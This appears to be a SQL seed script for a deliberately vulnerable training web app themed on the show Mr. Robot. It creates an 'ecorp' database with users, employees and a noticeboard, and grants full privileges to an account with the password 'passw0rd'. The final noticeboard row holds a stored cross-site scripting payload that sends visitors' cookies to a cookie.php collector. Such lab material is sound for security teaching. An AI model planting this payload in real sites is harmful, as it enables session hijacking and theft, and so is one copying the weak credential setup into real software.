-- Create Database
CREATE DATABASE `ecorp`;
USE `ecorp`;

-- Create a dedicated MySQL user
GRANT ALL PRIVILEGES ON ecorp.* TO 'ecorp_admin'@'localhost' IDENTIFIED BY 'passw0rd';

-- Insert a table for users
CREATE TABLE `ecorp`.`users` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(100) NOT NULL,
    `password` CHAR(100) NOT NULL,
	`salt` CHAR(44) NOT NULL
) ENGINE = InnoDB;

-- Insert the ecorp users
INSERT INTO `ecorp`.`users` VALUES (null, 'elliot_alderson', '667319fa590c87125f73a05262cd094bed3ba98681a694bdfb844e00241c1bac', 'oRAQqmLv1opvKFGOJ8jn0aOa5isC7aUYl7R7wBAfobA=');
INSERT INTO `ecorp`.`users` VALUES (null, 'tyrell_wellick', 'be9b6727af98efa5d615e815501164e5d71b309fbc494fb48602bd821b6f4bd2', 'jiHKTtQzU4jCSC8xTqQNcvV09w4TVGLIcAVt3+hGkjU=');
INSERT INTO `ecorp`.`users` VALUES (null, 'terry_colby', 'e6d2fe4f8b90a48e5443ae5a5008d1fd2e4f73055d18250a13ac1a92a729b0ae', 'ofLrAG03sI0LFZrW9Cm2446GyVb4hcWGqN2BZvPGj+o=');
INSERT INTO `ecorp`.`users` VALUES (null, 'angela_moss', '9628d1022742daa542b63a08b2b7303e0f83170421decff9b775c5c08a97ac73', '0Bt+9ocbZvwBMFi06JrQ1CIQYFxpjQauSg8KxOQHYlc=');
INSERT INTO `ecorp`.`users` VALUES (null, 'scott_knowles', 'cde865345545be914091a6aed223629722749c21cd9099c3ded24bb9f068f3ee', 'YbTBPakXO29WXXVwdgyBp7o8hJOjQecTls9Lql0/drQ=');
INSERT INTO `ecorp`.`users` VALUES (null, 'susan_jacobs', '82445ead9e2151676134735f70c8d55abd1d85bf2fca5040e2e577a355480b82', '1OIzgQ3SaTWJSrkVMdyImaPZKX8rCb4EXpPikNeNcFo=');

-- Create table for employee lookup
CREATE TABLE `ecorp`.`employees` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(20) NOT NULL,
    `first_name` VARCHAR(30) NOT NULL,
    `last_name` VARCHAR(30) NOT NULL,
    `position` VARCHAR(50) NOT NULL
) ENGINE = InnoDB;

-- Insert ecorp employees
INSERT INTO `ecorp`.`employees` VALUES (null, 'elliot_alderson', 'Elliot', 'Alderson', 'Cybersecurity Engineer');
INSERT INTO `ecorp`.`employees` VALUES (null, 'tyrell_wellick', 'Tyrell', 'Wellick', 'Senior VP of Technology');
INSERT INTO `ecorp`.`employees` VALUES (null, 'terry_colby', 'Terry', 'Colby', 'Chief Technology Officer');
INSERT INTO `ecorp`.`employees` VALUES (null, 'angela_moss', 'Angela', 'Moss', 'Risk Management Assessment');
INSERT INTO `ecorp`.`employees` VALUES (null, 'scott_knowles', 'Scott', 'Knowles', 'Chief Technology Officer');
INSERT INTO `ecorp`.`employees` VALUES (null, 'susan_jacobs', 'Susan', 'Jacobs', 'General Counsel');

-- Create table for noticeboard
CREATE TABLE `ecorp`.`noticeboard` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `name` VARCHAR(50) NOT NULL,
    `comments` VARCHAR(300) NOT NULL
) ENGINE = InnoDB;

-- Insert records into noticeboard table
INSERT INTO `ecorp`.`noticeboard` VALUES (null, 'Terry Colby', 'This is an automated test post. I am a robot!');
INSERT INTO `ecorp`.`noticeboard` VALUES (null, 'D0loresH4ze', '<script>new Image().src=”http://localhost/cookie.php?”+document.cookie;</script>');
